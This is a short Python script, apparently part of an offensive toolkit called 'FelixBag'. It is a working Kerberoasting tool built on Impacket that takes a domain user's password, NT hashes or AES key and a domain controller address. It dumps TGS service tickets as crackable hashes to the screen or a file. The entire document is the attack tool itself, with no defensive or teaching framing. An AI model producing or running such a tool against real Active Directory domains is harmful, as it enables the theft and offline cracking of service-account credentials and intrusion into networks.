#!/usr/bin/env python3
# FelixBag - Kerberoasting Module
# Requiere un usuario válido de dominio

import argparse
from impacket.examples import logger
from impacket.examples.kerberoast import Kerberoast

def main():
    parser = argparse.ArgumentParser(
        description='Kerberoasting using Impacket - Dump TGS service tickets for SPNs.'
    )
    parser.add_argument('domain', help='Domain name (e.g., acme.local)')
    parser.add_argument('username', help='Valid domain username')
    parser.add_argument('password', help='Password for the user')
    parser.add_argument('-dc-ip', required=True, help='IP of the Domain Controller')
    parser.add_argument('-output', help='Save hashes to a file (optional)')
    parser.add_argument('--hashes', help='LM:NT hashes instead of password')
    parser.add_argument('--aesKey', help='AES256 key instead of password')

    args = parser.parse_args()
    logger.init()

    target = f'{args.domain}/{args.username}:{args.password}'
    if args.hashes:
        target = f'{args.domain}/{args.username}:{args.hashes}'
    if args.aesKey:
        target = f'{args.domain}/{args.username}::{args.aesKey}'

    try:
        roaster = Kerberoast()
        roaster.main(target=target, dc_ip=args.dc_ip, outputfile=args.output)
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == '__main__':
    main()
